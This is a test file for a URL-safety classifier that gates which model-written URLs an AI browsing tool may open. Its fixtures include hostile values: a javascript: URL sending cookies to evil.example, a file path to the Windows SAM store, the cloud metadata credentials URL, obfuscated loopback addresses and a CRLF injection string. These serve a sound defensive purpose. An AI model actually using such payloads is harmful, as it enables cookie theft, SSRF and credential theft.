/**
 * URL classification.
 *
 * The browser's first gate, and the one that decides whether a string the
 * model produced becomes a network request. It is pure, so it can be tested
 * exhaustively — which matters, because the interesting cases here are all
 * near-misses: a spelling of "localhost" that a naive check misses is not a
 * cosmetic bug, it is an SSRF.
 */

import { describe, expect, it } from 'vitest';
import { BROWSING_LIMITS } from '@axon/core';
import { classifyUrl, isNavigable, navigationRisk } from '../src/main/browser/url-policy.js';

describe('ordinary public addresses', () => {
  it.each([
    'https://github.com',
    'https://github.com/anthropics/anthropic-sdk-typescript/issues/1',
    'http://example.com',
    'https://example.com:443/path?q=1#fragment',
    'http://example.com:80/',
    'https://sub.domain.example.co.uk/a/b/c',
  ])('accepts %s', (url) => {
    const verdict = classifyUrl(url);
    expect(verdict.class).toBe('PUBLIC');
    expect(navigationRisk(url).level).toBe('SAFE');
    expect(isNavigable(url)).toBe(true);
  });

  it('normalizes what it accepts', () => {
    // What gets navigated to is the parsed form, not the string as written.
    const verdict = classifyUrl('HTTPS://GitHub.COM/Anthropics');
    expect(verdict.normalized).toBe('https://github.com/Anthropics');
    expect(verdict.host).toBe('github.com');
  });

  it('accepts a bare host with a scheme and nothing else', () => {
    expect(classifyUrl('https://example.com').normalized).toBe('https://example.com/');
  });
});

describe('schemes that are not the web', () => {
  it.each([
    ['javascript:alert(1)', 'javascript'],
    ['javascript:fetch("https://evil.example?c="+document.cookie)', 'javascript'],
    ['data:text/html,<script>alert(1)</script>', 'data'],
    ['file:///C:/Windows/System32/config/SAM', 'file'],
    ['file://server/share', 'file'],
    ['blob:https://example.com/uuid', 'blob'],
    ['about:blank', 'about'],
    ['chrome://settings', 'chrome'],
    ['devtools://devtools/bundled/inspector.html', 'devtools'],
    ['ms-settings:privacy', 'ms-settings'],
    ['ftp://example.com/file', 'ftp'],
    ['ws://example.com/socket', 'ws'],
    ['mailto:someone@example.com', 'mailto'],
    ['tel:+15551234', 'tel'],
    ['view-source:https://example.com', 'view-source'],
  ])('refuses %s outright', (url) => {
    const verdict = classifyUrl(url);
    expect(verdict.class).toBe('FORBIDDEN_SCHEME');
    // FORBIDDEN, not approvable: no user can meaningfully consent to
    // "navigate to a javascript: URL the model wrote".
    expect(navigationRisk(url).level).toBe('FORBIDDEN');
    expect(isNavigable(url)).toBe(false);
    expect(verdict.normalized).toBeNull();
  });

  it('refuses a scheme however it is cased or padded', () => {
    for (const url of ['JavaScript:alert(1)', '  javascript:alert(1)  ', 'JAVASCRIPT:alert(1)']) {
      expect(isNavigable(url)).toBe(false);
    }
  });
});

describe('the local machine and the local network', () => {
  it.each([
    'http://localhost',
    'http://localhost:8080/admin',
    'https://LOCALHOST/',
    'http://app.localhost/',
    'http://printer.local/',
    'http://service.internal/',
    'http://router.home.arpa/',
    'http://127.0.0.1',
    'http://127.0.0.1:9222/json',
    'http://127.1.2.3/',
    'http://0.0.0.0/',
    'http://10.0.0.1/',
    'http://10.255.255.255/',
    'http://172.16.0.1/',
    'http://172.31.255.254/',
    'http://192.168.1.1/',
    'http://192.168.0.254/admin',
    'http://169.254.169.254/latest/meta-data/',
    'http://100.64.0.1/',
    'http://[::1]:8080/',
    'http://[fe80::1]/',
    'http://[fd00::1]/',
    'http://[::ffff:127.0.0.1]/',
    'http://[::ffff:10.0.0.1]/',
    'http://[0:0:0:0:0:ffff:169.254.169.254]/',
  ])('refuses %s', (url) => {
    expect(classifyUrl(url).class).toBe('PRIVATE');
    expect(navigationRisk(url).level).toBe('FORBIDDEN');
    expect(isNavigable(url)).toBe(false);
  });

  it('refuses the cloud metadata address specifically', () => {
    // The one that returns credentials to anything that asks, on a great many
    // hosts. Worth its own test so nobody relaxes 169.254/16 casually.
    const verdict = classifyUrl('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
    expect(verdict.class).toBe('PRIVATE');
  });

  it('decodes an IPv4-mapped address however the parser rewrites it', () => {
    // Regression. `new URL('http://[::ffff:127.0.0.1]/').hostname` is
    // `[::ffff:7f00:1]` — the readable form never reaches the check, so a
    // matcher written against the dotted spelling passed loopback as public.
    expect(classifyUrl('http://[::ffff:127.0.0.1]/').host).toBe('[::ffff:7f00:1]');
    expect(classifyUrl('http://[::ffff:127.0.0.1]/').class).toBe('PRIVATE');
    expect(classifyUrl('http://[::ffff:7f00:1]/').class).toBe('PRIVATE');
  });

  it('still accepts an IPv4-mapped public address', () => {
    // The check decodes rather than refusing the whole `::ffff:` family, so a
    // genuinely public mapped address is not collateral damage.
    expect(classifyUrl('http://[::ffff:8.8.8.8]/').class).toBe('PUBLIC');
  });

  it('is not fooled by alternative spellings of an address', () => {
    // A resolver reads all of these as loopback. A `startsWith('127.')` check
    // reads none of them that way.
    for (const url of ['http://0x7f.0.0.1/', 'http://0177.0.0.1/', 'http://127.0.0.001/']) {
      expect(isNavigable(url), url).toBe(false);
    }
  });

  it('still accepts public addresses that merely look similar', () => {
    // The reverse failure: refusing legitimate hosts because they start with
    // the same digits.
    for (const url of ['http://10a.example.com/', 'https://192.168.example.com/', 'https://localhost.example.com/']) {
      expect(isNavigable(url), url).toBe(true);
    }
  });
});

describe('unusual ports', () => {
  it.each(['http://example.com:8080/', 'https://example.com:3000/', 'https://example.com:22/'])(
    'asks before opening %s',
    (url) => {
      expect(classifyUrl(url).class).toBe('UNUSUAL_PORT');
      // Approvable rather than refused: a real service on a non-standard port
      // is a normal thing for a person to ask for, and they can see the port.
      expect(navigationRisk(url).level).toBe('REQUIRES_APPROVAL');
      expect(isNavigable(url)).toBe(true);
    },
  );
});

describe('malformed and hostile shapes', () => {
  it.each([
    ['an empty string', ''],
    ['whitespace', '   '],
    ['a bare host with no scheme', 'github.com'],
    ['a path with no host', '/issues/1'],
    ['nonsense', 'not a url at all'],
    ['a scheme with no host', 'https://'],
  ])('refuses %s', (_label, url) => {
    expect(classifyUrl(url).class).toBe('INVALID');
    expect(isNavigable(url)).toBe(false);
  });

  it('refuses a non-string', () => {
    for (const value of [null, undefined, 42, {}, [], true]) {
      expect(classifyUrl(value).class).toBe('INVALID');
    }
  });

  it('refuses control characters, which is where smuggling starts', () => {
    for (const url of ['https://example.com/\npath', 'https://example.com/\r\nHost: evil', 'https://exa\u0000mple.com/']) {
      expect(classifyUrl(url).class).toBe('INVALID');
    }
  });

  it('refuses credentials embedded in the URL', () => {
    // A password in a URL is a secret in a place that gets logged.
    expect(classifyUrl('https://user:hunter2@example.com/').class).toBe('INVALID');
    expect(classifyUrl('https://token@example.com/').class).toBe('INVALID');
  });

  it('refuses a URL past the length limit', () => {
    const long = `https://example.com/${'a'.repeat(BROWSING_LIMITS.maxUrlCharacters)}`;
    expect(classifyUrl(long).class).toBe('INVALID');
  });

  it('never returns SAFE for something it could not classify', () => {
    // The deny-by-default rule, stated as a property over the invalid cases.
    for (const value of ['', 'nonsense', null, 42, 'https://', '/relative']) {
      expect(navigationRisk(value).level).not.toBe('SAFE');
    }
  });

  it('never throws, whatever it is given', () => {
    const nasty: unknown[] = [Symbol('x'), () => {}, new Map(), Number.NaN, Infinity, { toString: () => { throw new Error('no'); } }];
    for (const value of nasty) {
      expect(() => classifyUrl(value)).not.toThrow();
    }
  });
});

describe('the classification is exhaustive', () => {
  it('gives every input exactly one class, and SAFE only to PUBLIC', () => {
    const samples = [
      'https://example.com',
      'https://example.com:8443/',
      'http://127.0.0.1',
      'javascript:alert(1)',
      'nonsense',
    ];
    for (const sample of samples) {
      const verdict = classifyUrl(sample);
      const risk = navigationRisk(sample);
      expect(['PUBLIC', 'UNUSUAL_PORT', 'PRIVATE', 'FORBIDDEN_SCHEME', 'INVALID']).toContain(verdict.class);
      if (risk.level === 'SAFE') expect(verdict.class).toBe('PUBLIC');
      if (verdict.class !== 'PUBLIC') expect(risk.level).not.toBe('SAFE');
    }
  });

  it('always explains itself', () => {
    for (const sample of ['https://example.com', 'http://10.0.0.1', 'javascript:x', '']) {
      expect(classifyUrl(sample).reason.length).toBeGreaterThan(10);
    }
  });
});
